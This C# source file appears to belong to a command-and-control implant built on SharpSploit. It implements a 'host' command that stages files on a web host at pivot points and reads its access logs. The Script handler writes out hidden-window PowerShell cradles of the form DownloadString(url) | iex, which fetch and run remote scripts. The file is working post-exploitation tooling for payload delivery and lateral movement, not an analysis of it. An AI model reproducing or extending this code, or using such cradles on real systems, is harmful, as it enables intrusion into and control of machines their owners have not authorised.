using Agent.Commands.Services;
using Agent.Communication;
using Agent.Models;
using Agent.Service;
using Agent.Service.Pivoting;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Agent.Service.RunningService;

namespace Agent.Commands
{
    public class WebHostCommand : AgentCommand
    {
        public override string Name => "host";

        public IWebHostService Service { get; set; }

        protected Dictionary<string, Action<AgentTask, AgentCommandContext, string[]>> dico = new Dictionary<string, Action<AgentTask, AgentCommandContext, string[]>>();

        public WebHostCommand()
        {
            this.Service = ServiceProvider.GetService<IWebHostService>();

            this.Register("push", this.Push);
            this.Register("rm", this.Remove);
            this.Register("clear", this.Clear);
            this.Register("show", this.Show);
            this.Register("script", this.Script);
            this.Register("log", this.Log);
            this.Register("aaa", this.Log);
        }

        public void Register(string verb, Action<AgentTask, AgentCommandContext, string[]> action)
        {
            dico.Add(verb, action);
        }

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            var verb = task.SplittedArgs[0];
            int argLength = task.SplittedArgs.Length - 1;
            //context.Result.Result += argLength + Environment.NewLine;
            var args = new string[argLength];
            //context.Result.Result += "for" + Environment.NewLine;
            for (int i = 0; i < argLength; ++i)
                args[i] = task.SplittedArgs[i+1];
            //context.Result.Result += "args done" + Environment.NewLine;
            if (dico.TryGetValue(verb, out var action))
                action(task, context, args);
        }



        protected void Remove(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (args.Length == 0)
            {
                context.Result.Result = $"Path must be specified!";
                return;
            }

            string path = args[0].ToLower();
            var wh = this.Service.Get(path);
            if (wh == null)
            {
                context.Result.Result = $"{path} is not hosted on the WebHost!";
                return;
            }

            this.Service.Remove(path);
            context.Result.Result = $"File {path} removed from the WebHost!";

        }

        protected void Clear(AgentTask task, AgentCommandContext context, string[] args)
        {
            this.Service.Clear();
            context.Result.Result = $"Files removed from the WebHost!";
        }

        protected void Push(AgentTask task, AgentCommandContext context, string[] args)
        {
            //context.Result.Result += "Args = " + Environment.NewLine;
            //foreach (var arg in args)
            //    context.Result.Result += arg + Environment.NewLine;

            this.CheckFileDownloaded(task, context);
            var file = context.FileService.ConsumeDownloadedFile(task.FileId);

            var wh = new FileWebHost()
            {
                Path = file.Name,
                Data = file.GetFileContent(),
                IsPowershell = args.Length > 0 && args[0] == "True",
                Description = args.Length > 1 ? args[1] : String.Empty
            };
            this.Service.Add(file.Name, wh);
            context.Result.Result += $"File {file.Name} stored on the WebHost!";
        }


        protected void Show(AgentTask task, AgentCommandContext context, string[] args)
        {
            var allItems = this.Service.GetAll();
            if (allItems.Count == 0)
            {
                context.Result.Result += "No files are hosted.";
                return;
            }

            var pivotService = ServiceProvider.GetService<IPivotService>();
            var pivots = pivotService.Pivots.Where(p => p is PivotHttpServer).ToList();

            if (pivots.Count > 0)
            {
                foreach (var pivot in pivots)
                {
                    context.Result.Result += "Pivot " + pivot.Connexion.ToString() + " :" + Environment.NewLine;
                    var results = new SharpSploitResultList<WebHostShowResult>();
                    foreach (var item in allItems)
                    {
                        results.Add(new WebHostShowResult()
                        {
                            Url = pivot.Connexion.ToString() + "/" + item.Path,
                            IsPowerShell = item.IsPowershell ? "Yes" : "No",
                            Description = item.Description,
                        });
                    }
                    context.Result.Result += results.ToString();
                }
            }
            else
            {
                var results = new SharpSploitResultList<WebHostShowResult>();
                foreach (var item in allItems)
                {
                    results.Add(new WebHostShowResult()
                    {
                        Url = item.Path,
                        IsPowerShell = item.IsPowershell ? "Yes" : "No",
                        Description = item.Description,
                    });
                }
                context.Result.Result += results.ToString();
            }
        }

        protected void Log(AgentTask task, AgentCommandContext context, string[] args)
        {
            var allItems = this.Service.GetLogs();
            if (allItems.Count == 0)
            {
                context.Result.Result += "No logs.";
                return;
            }

            var results = new SharpSploitResultList<WebHostLogResult>();
            foreach (var item in allItems)
            {
                results.Add(new WebHostLogResult()
                {
                    Url = item.Url,
                    Date = item.Date.ToString(),
                    StatusCode = item.StatusCode.ToString(),
                    UserAgent = item.UserAgent ?? String.Empty
                });
                context.Result.Result += results.ToString();
            }
        }

        protected void Script(AgentTask task, AgentCommandContext context, string[] args)
        {
            var allItems = this.Service.GetAll().Where(i => i.IsPowershell).ToList();
            if (allItems.Count == 0)
            {
                context.Result.Result += "No scripts are available.";
                return;
            }

            var pivotService = ServiceProvider.GetService<IPivotService>();
            var pivots = pivotService.Pivots.Where(p => p is PivotHttpServer).ToList();

            if (pivots.Count == 0)
            {
                context.Result.Result += "No scripts are available.";
                return;
            }

            foreach (var pivot in pivots)
            {
                context.Result.Result += "Pivot " + pivot.Connexion.ToString() + " :" + Environment.NewLine;
                foreach (var item in allItems)
                {
                    string script = $"(New-Object Net.WebClient).DownloadString('{pivot.Connexion}/{item.Path}') | iex";
                    context.Result.Result +=  $"{item.Path} => powershell -noP -sta -w 1 -c \"{script}\"" + Environment.NewLine;
                }
            }
        }

        public sealed class ListWebHostFileResult : SharpSploitResult
        {

            public string File { get; set; }

            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(File), Value = File },
            };
        }

        public sealed class WebHostShowResult : SharpSploitResult
        {
            public string Url { get; set; }
            public string IsPowerShell { get; set; }
            public string Description { get; set; }



            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(Url), Value = Url },
                new SharpSploitResultProperty { Name = nameof(IsPowerShell), Value = IsPowerShell },
                new SharpSploitResultProperty { Name = nameof(Description), Value = Description },
            };
        }

        public sealed class WebHostLogResult : SharpSploitResult
        {
            public string Date { get; set; }
            public string Url { get; set; }
            public string UserAgent { get; set; }

            public string StatusCode { get; set; }



            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(Date), Value = Date },
                new SharpSploitResultProperty { Name = nameof(Url), Value = Url },
                new SharpSploitResultProperty { Name = nameof(UserAgent), Value = UserAgent },
                new SharpSploitResultProperty { Name = nameof(StatusCode), Value = StatusCode },
            };
        }
    }
}
